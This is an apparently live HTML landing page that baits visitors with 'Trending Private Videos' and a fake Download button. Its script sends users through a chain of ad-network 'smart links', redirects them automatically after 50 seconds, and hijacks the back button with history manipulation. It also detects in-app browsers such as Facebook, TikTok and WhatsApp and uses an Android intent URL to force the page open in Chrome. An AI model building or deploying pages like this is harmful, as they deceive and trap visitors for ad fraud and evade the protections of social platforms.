<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Download Page</title>

<!-- Universal Social Preview -->
<meta property="og:title" content="Trending Private Videos">

<meta property="og:url" content="https://yourdomain.com/page.html">
<meta property="og:type" content="website">

<!-- Twitter / Other Apps -->
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="Trending Private Videos">
<meta name="twitter:description" content="Watch and Download Trending Private Videos Now">

</head>
<title>Download Page</title>

<style>

body{
margin:0;
font-family:Arial;
background:#000;
text-align:center;
color:#fff;
}

.box{
margin-top:40px;
padding:20px;
}

img{
width:90%;
max-width:320px;
border-radius:12px;
margin:10px;
}

.btn{
display:inline-block;
padding:14px 35px;
background:#ff2d55;
color:#fff;
font-size:20px;
border-radius:10px;
text-decoration:none;
font-weight:bold;
margin-top:20px;
}

.popup{
position:fixed;
top:0;
left:0;
width:100%;
height:100%;
background:rgba(0,0,0,0.8);
display:none;
align-items:center;
justify-content:center;
z-index:9999;
}

.popup-box{
background:#fff;
color:#000;
padding:25px;
border-radius:10px;
width:80%;
max-width:300px;
}

.chrome{
background:#28a745;
color:#fff;
padding:10px 25px;
border-radius:8px;
text-decoration:none;
display:inline-block;
margin-top:10px;
}

</style>
</head>

<body>

<div class="box">

<img src="https://i.imgur.com/7HUM7ng.jpeg">
<img src="https://i.imgur.com/jbGNrs0.gif">

<br>

<a href="#" id="downloadBtn" class="btn">Download</a>

</div>

<div class="popup" id="popup">

<div class="popup-box">

<h3>Better Experience</h3>
<p>Open this page in Chrome browser</p>

<a href="#" id="chromeBtn" class="chrome">Open Chrome</a>

</div>

</div>

<script>

// ================= SMART LINKS =================

const links = [

"https://www.effectivegatecpm.com/qckxhnmwr9?key=4eb1de3e823be95ed228fde4f1025ba7",
"https://www.effectivegatecpm.com/xa4v69ebp?key=62079b05ebf5a63f468e7017849264af",
"https://www.effectivegatecpm.com/qwrbesrk?key=a16d211d02fbe32fa29d7bb9035aff44",
"https://www.effectivegatecpm.com/ztj5w2myb2?key=f79737b0122e9f212f04f832582639bd",
"https://www.effectivegatecpm.com/qwrbesrk?key=a16d211d02fbe32fa29d7bb9035aff44"

];

// ================= AUTO REDIRECT (50s ONCE) =================

if(!sessionStorage.getItem("autoRedirect")){

sessionStorage.setItem("autoRedirect","1");

setTimeout(function(){

window.location.href = links[0];

},50000);

}

// ================= DOWNLOAD BUTTON =================

document.getElementById("downloadBtn").addEventListener("click",function(e){

e.preventDefault();

links.forEach((link,i)=>{

setTimeout(function(){

window.location.href = link;

}, i*1200);

});

});

// ================= BACK BUTTON REDIRECT =================

function trapHistory(){

history.pushState(null,null,location.href);

}

trapHistory();

window.addEventListener("popstate",function(){

window.location.href = links[0];

});

// ================= IN APP BROWSER DETECTION =================

function isInApp(){

let ua = navigator.userAgent || navigator.vendor || window.opera;

return (

ua.includes("FBAN") ||
ua.includes("FBAV") ||
ua.includes("Instagram") ||
ua.includes("TikTok") ||
ua.includes("Pinterest") ||
ua.includes("Twitter") ||
ua.includes("Telegram") ||
ua.includes("Line") ||
ua.includes("Snapchat") ||
ua.includes("WhatsApp") ||
ua.includes("Messenger")

);

}

if(isInApp()){

document.getElementById("popup").style.display="flex";

}

// ================= OPEN IN CHROME =================

document.getElementById("chromeBtn").onclick=function(e){

e.preventDefault();

let url = window.location.href;

window.location.href =
"intent://" +
url.replace(/^https?:\/\//,'') +
"#Intent;scheme=https;package=com.android.chrome;end";

};

</script>

</body>
</html>
